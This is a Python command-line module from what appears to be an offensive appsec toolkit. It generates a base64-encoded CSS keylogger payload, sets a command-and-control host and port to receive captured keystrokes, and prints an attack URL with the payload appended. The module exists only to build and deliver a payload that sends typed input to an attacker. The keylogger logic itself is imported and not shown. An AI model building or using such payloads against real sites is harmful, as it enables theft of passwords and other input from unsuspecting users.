"""
Generate a basic CSS keylogger payload that reports to a specified C2. Output
is base64 encoded.
"""
from appsec_wtf.exploit.css import example_keylogger

def set_cli_opts(parser):
    """
    Set the CLI options supported by this command.
    """
    parser.set_defaults(func=entry)

    parser.add_argument(
        "--host",
        default="localhost",
        help="""
        Set the host that should be used in the generated payload. Default is
        %(default)s.
        """
    )
    parser.add_argument(
        "--c2-host",
        default="localhost",
        help="""
        Set the host that should be used as the c2 host in the generated
        payload. Default is %(default)s.
        """
    )
    parser.add_argument(
        "--port",
        default=3000,
        help="""
        Set the port that should be used in the generated payload. Default is
        %(default)s.
        """
    )
    parser.add_argument(
        "--c2-port",
        default=8000,
        help="""
        Set the port that should be used as the c2 port in the generated
        payload. Default is %(default)s.
        """
    )
    parser.add_argument(
        "--endpoint",
        default="/",
        help="""
        Set the endpoint that should be used in the generated payload. Default
        is %(default)s.
        """
    )
    parser.add_argument(
        "--https",
        default=False,
        action="store_true",
        help="""
        Use HTTPS for the generated payload.
        """
    )
    parser.add_argument(
        "--c2-https",
        default=False,
        action="store_true",
        help="""
        Use HTTPS for connecting to the c2 in the generated payload. Default
        is %(default)s.
        """
    )

def entry(args):
    """
    TODO: DOC
    """
    print "{protocol}://{host}:{port}{endpoint}{payload}".format(
        protocol="https" if args.https else "http",
        host=args.host,
        port=str(args.port),
        endpoint=args.endpoint,
        payload=example_keylogger(
                exfil_host=args.c2_host,
                exfil_port=args.c2_port,
                https=args.c2_https
        )
    )
